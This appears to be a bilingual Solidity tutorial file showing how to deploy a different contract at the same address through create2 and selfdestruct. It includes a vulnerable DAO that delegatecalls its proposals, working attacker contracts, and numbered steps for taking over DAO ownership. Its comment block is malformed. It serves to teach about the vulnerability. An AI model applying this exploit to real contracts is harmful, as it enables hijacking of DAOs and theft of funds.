// Subir dos contratos diferentes en la misma dirección / Deploy Different Contracts at the Same Address

//La dirección del contrato implementada con create se calcula de la siguiente manera.

contract address = last 20 bytes of sha3(rlp_encode(sender, nonce))

/* Donde el remitente es la dirección del implementador y nonce es el número de transacciones enviadas por el remitente.
Por lo tanto, es posible implementar diferentes contratos en la misma dirección si de alguna manera podemos restablecer el nonce.
A continuación se muestra un ejemplo de cómo se puede piratear una DAO.

*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

0. Implementar DAO

Llamado por el atacante
1. Implementar DeployerDeployer
2. Llame a DeployerDeployer.deploy()
3. Llame a Deployer.deployProposal()

Llamado por Alicia
4. Obtenga la aprobación de la propuesta por parte de DAO

Llamado por el atacante
5. Eliminar propuesta y implementador
6. Volver a implementar el implementador
7. Llame a Deployer.deployAttack()
8. Llame a DAO.execute
9. Verifique que DAO.owner sea la dirección del atacante.

DAO -- aprobado --> Propuesta
DeployerDeployer -- crear2 --> Implementador -- crear --> Propuesta
DeployerDeployer -- crear2 --> Deployer -- crear --> Ataque
*/


contract DAO {
    struct Proposal {
        address target;
        bool approved;
        bool executed;
    }

    address public owner = msg.sender;
    Proposal[] public proposals;

    function approve(address target) external {
        require(msg.sender == owner, "not authorized");

        proposals.push(Proposal({target: target, approved: true, executed: false}));
    }

    function execute(uint256 proposalId) external payable {
        Proposal storage proposal = proposals[proposalId];
        require(proposal.approved, "not approved");
        require(!proposal.executed, "executed");

        proposal.executed = true;

        (bool ok, ) = proposal.target.delegatecall(
            abi.encodeWithSignature("executeProposal()")
        );
        require(ok, "delegatecall failed");
    }
}

contract Proposal {
    event Log(string message);

    function executeProposal() external {
        emit Log("Excuted code approved by DAO");
    }

    function emergencyStop() external {
        selfdestruct(payable(address(0)));
    }
}

contract Attack {
    event Log(string message);

    address public owner;

    function executeProposal() external {
        emit Log("Excuted code not approved by DAO :)");
        // For example - set DAO's owner to attacker
        owner = msg.sender;
    }
}

contract DeployerDeployer {
    event Log(address addr);

    function deploy() external {
        bytes32 salt = keccak256(abi.encode(uint(123)));
        address addr = address(new Deployer{salt: salt}());
        emit Log(addr);
    }
}

contract Deployer {
    event Log(address addr);

    function deployProposal() external {
        address addr = address(new Proposal());
        emit Log(addr);
    }

    function deployAttack() external {
        address addr = address(new Attack());
        emit Log(addr);
    }

    function kill() external {
        selfdestruct(payable(address(0)));
    }
}
